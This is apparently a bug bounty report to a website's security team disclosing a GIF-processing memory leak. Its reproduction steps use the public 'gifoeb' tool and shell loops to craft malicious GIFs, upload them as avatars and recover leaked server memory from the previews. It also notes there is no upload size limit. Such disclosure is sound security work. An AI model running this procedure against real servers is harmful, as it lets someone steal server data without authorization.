## Vulnerability Information
Hi security team,


**Summary:** Please refer to #302885 for more details. Uploading a .gif produces significantly different images every time which means the server is leaking information.  

## Steps To Reproduce:


  1. Clone https://github.com/neex/gifoeb
  2. Generate exploitable gif with ./gifoeb gen 5120x5120 
  3. Upload gif as a profile picture at https://www.niche.co/users/{username}/account 
  4. Download the preview from aws at https://niche-s3-production.s3.amazonaws.com/uploads/user/avatar/....  as preview.ext
  5. run `` r=$(identify -format '%wx%h' preview.ext[0]) && for i in `seq 1 10`  ; do ./gifoeb gen $r for_upload/$i.gif; done``
  6. Upload the gif to the server and download the results
  7. Recover the servers response with ` for p in previews/*; do  ./gifoeb recover $p | strings; done`

Also while trying that I noticed there is no limit on how large of a gif a person can upload which could lead to some bottlenecks. https://www.niche.co/users/script-1-alert-script/posts



## Supporting Material/References:

Even though the first 2 attempts did not reveal sensitive data I think it is enough as a POC. Feel free to check out the uploads. If marked as Needs More Info I can keep trying to get sensitive data.

## Impact

By automating the process an attacker can gain valuable information from the server.
